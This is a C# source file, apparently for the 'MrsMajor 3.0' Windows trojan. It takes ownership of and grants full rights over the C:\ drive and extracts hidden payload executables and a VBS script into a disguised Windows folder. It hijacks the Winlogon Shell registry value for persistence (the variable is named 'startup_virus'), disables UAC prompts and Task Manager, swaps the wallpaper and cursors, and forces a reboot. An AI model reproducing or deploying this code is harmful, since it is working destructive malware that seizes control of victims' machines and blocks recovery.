using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Reflection;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace MrsMajor3._0
{
    static class Program
    {
        [STAThread]

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern bool SystemParametersInfo(uint uAction, uint uParam, string lpvParam, uint fuWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x0014;
        private const uint SPIF_UPDATEINIFILE = 1;
        private const uint SPIF_SENDWININICHANGE = 2;

        private readonly static string exefolder = Directory.GetCurrentDirectory();
        private static readonly StringBuilder img = new StringBuilder($@"{Path.GetTempPath()}\wlp.tmp");
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        static void Main()
        {
            string temp = Path.GetTempPath();
            string ExtPath = "C:\\windows\\winbase_base_procid_none\\secureloc0x65\\";
            Directory.CreateDirectory("C:\\windows\\winbase_base_procid_none\\secureloc0x65");
            {
                Process prc = new Process();
                prc.StartInfo.FileName = "C:\\windows\\system32\\takeown.exe";
                prc.StartInfo.Arguments = "/f C:\\";
                prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                prc.StartInfo.Verb = "runas";
                prc.Start();
                Process prcx = new Process();
                prcx.StartInfo.FileName = "C:\\windows\\system32\\icacls.exe";
                prcx.StartInfo.Arguments = @"C:\ /granted """ +
                                           Environment.GetEnvironmentVariable("USERNAME") + @""":F";
                prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                prcx.StartInfo.Verb = "runas";
                prcx.Start();
                {
                    Extract("MM3", ExtPath, "Resources", "gdifuncs.exe");
                    Extract("MM3", ExtPath, "Resources", "mainbgtheme.wav");
                    Extract("MM3", ExtPath, "Resources", "WinRapistI386.vbs");
                    Extract("MM3", ExtPath, "Resources", "rcur.cur");
                    Extract("MM3", ExtPath, "Resources", "ui65.exe");
                    Extract("MM3", ExtPath, "Resources", "logonuiOWR.exe");
                    Extract("MM3", temp, "Resources", "wlp.tmp");
                    {
                        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, img.ToString(), SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
                        Microsoft.Win32.RegistryKey startup_virus = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
                        startup_virus.SetValue("Shell", @"explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""");
                        startup_virus.Dispose();
                            Microsoft.Win32.RegistryKey cursor = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                            cursor.SetValue("Arrow", @"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
                            cursor.SetValue("AppStarting", @"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
                            cursor.SetValue("Hand", @"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
                            cursor.Dispose();
                        Microsoft.Win32.RegistryKey uac = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system");
                        uac.SetValue("ConsentPromptBehaviorAdmin", 0);
                        uac.Dispose();
                        Microsoft.Win32.RegistryKey taskmgr = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                        taskmgr.SetValue("DisableTaskMgr", 1);
                        taskmgr.Dispose();
                        System.Threading.Thread.Sleep(3000);
                            {
                                ProcessStartInfo shutdown = new ProcessStartInfo();
                                shutdown.FileName = "shutdown.exe";
                                shutdown.Arguments = "/r /t 00";
                                Process.Start(shutdown);
                            }
                        }
                    }
                }
            }
        }
    }